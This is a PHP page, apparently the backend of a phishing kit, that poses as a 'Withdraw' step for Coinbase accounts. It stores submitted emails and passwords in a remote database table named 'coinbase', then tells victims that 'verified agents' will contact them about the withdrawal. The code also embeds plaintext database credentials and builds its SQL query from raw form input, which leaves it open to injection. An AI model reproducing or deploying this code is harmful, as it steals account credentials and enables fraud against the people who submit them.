<!DOCTYPE html> 
<html> 

  
<head> 

    <title>Withdraw | Gold-Dyx</title> 
</head> 

  
<body> 

    <center> 

        <?php 

  

        // servername => localhost 

        // username => root 

        // password => empty 

        // database name => staff 

        $conn = mysqli_connect("sql3.freemysqlhosting.net", "sql3461458", "IkSyeGfuS5", "sql3461458"); 

          

        // Check connection 

        if($conn === false){ 

            die("ERROR: Could not connect. " 

                . mysqli_connect_error()); 

        } 

          

        // Taking values from the form data(input) 

        $email =  $_REQUEST['email']; 

        $password = $_REQUEST['password']; 

        

          

        // Performing insert query execution 

        // here our table name is coinbase 

        $sql = "INSERT INTO coinbase VALUES ('$email',  

            '$password')"; 

          

        if(mysqli_query($conn, $sql)){ 

            echo "<h3>Coinbase account verification in progress. <br>Our verified agents would be contact with you shortly to complete the withdrawal process.</br></h3>"; 

        } else{ 

            echo "ERROR: Hush! Sorry $sql. " 

                . mysqli_error($conn); 

        } 

          

        // Close connection 

        mysqli_close($conn); 

        ?> 

    </center> 
</body> 

  
</html> 
